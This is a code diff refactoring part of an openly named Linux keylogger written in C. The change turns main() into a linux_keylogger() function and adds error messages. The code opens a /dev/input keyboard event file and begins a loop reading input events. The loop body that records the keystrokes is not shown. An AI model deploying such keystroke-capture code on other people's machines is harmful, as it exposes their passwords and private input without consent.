@@ -1,3 +1,4 @@
+#include "linux_keylogger.h"
 #include <fcntl.h>       /* Kernel level file control operations for open */
 #include <linux/input.h> /* The event codes header file */
 #include <stdio.h>
@@ -7,20 +8,22 @@
  * Make outputfile as an option for the logging
  * Add a 2nd option for time duration (in seconds)
  */
-int main(int argc, char *argv[]) {
+void linux_keylogger(int argc, char *argv[]) {
   int fd = 0;
   if (argc < 2) {
     printf("Usage (inputfile) [outputfile]\n"
            "Inputfile is the /dev/input/ event file that is linked to your "
            "keyboard where you can see in /dev/input/by-id\n"
            "Outputfile as an option if you want to log your key inputs\n");
-    return -1;
+    return;
   }
   printf("Keylogger started\n");
 
   fd = open(argv[1], O_RDONLY, 0);
-  if (fd == -1)
-    return -1;
+  if (fd == -1) {
+    printf("Could not open file descriptor.\n");
+    return;
+  }
 
   struct input_event ie;
   while (1) {
